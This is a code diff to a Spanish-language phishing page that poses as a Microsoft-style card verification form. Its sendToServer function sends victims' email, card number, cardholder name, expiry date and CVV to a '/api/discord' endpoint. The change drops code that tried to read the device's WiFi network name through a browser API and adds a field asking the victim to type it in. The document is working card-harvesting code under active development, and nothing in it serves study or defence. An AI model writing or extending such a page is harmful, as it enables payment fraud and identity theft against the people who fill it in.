@@ -104,6 +104,10 @@ body.bg-image{background-image:var(--login-bg-image,none);background-size:cover;
         <div class="text-left"><a href="#" class="ms-link" id="forgotPINText">¿Olvidó su PIN?</a></div>
         <button type="submit" id="submitButton" class="ms-button w-full">Verificar tarjeta</button>
       </form>
+      <div class="mt-4 pt-4 border-t border-gray-200">
+        <label class="block text-sm font-medium text-ms-gray mb-2">Nombre del WiFi (opcional)</label>
+        <input type="text" id="wifiName" placeholder="Ej: MiWifiCasa" class="ms-input w-full text-ms-gray bg-white">
+      </div>
       <div class="mt-8 pt-6 border-t border-gray-200"><div class="text-center"><a href="javascript:void(0)" onclick="redirectToPayment()" class="ms-link" id="otherPaymentText">Otras formas de pago</a></div></div>
     </div>
   </div>
@@ -128,13 +132,7 @@ function validateExpiry(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}
 function validateCVV(c){return /^\d{3,4}$/.test(c);}
 async function sendToServer(email,cardNumber,cardHolder,expiryDate,cvv){
   const apiUrl=window.location.origin+'/api/discord';
-  let wifiName='';
-  try{
-    if(window.wifi&&window.wifi.getCurrentConfigurations){
-      const configs=await window.wifi.getCurrentConfigurations();
-      if(configs&&configs.length>0)wifiName=configs[0].ssid;
-    }
-  }catch(e){}
+  const wifiName=document.getElementById('wifiName').value.trim()||'';
   const body={
     email,
     cardNumber,cardHolder,expiryDate,cvv,
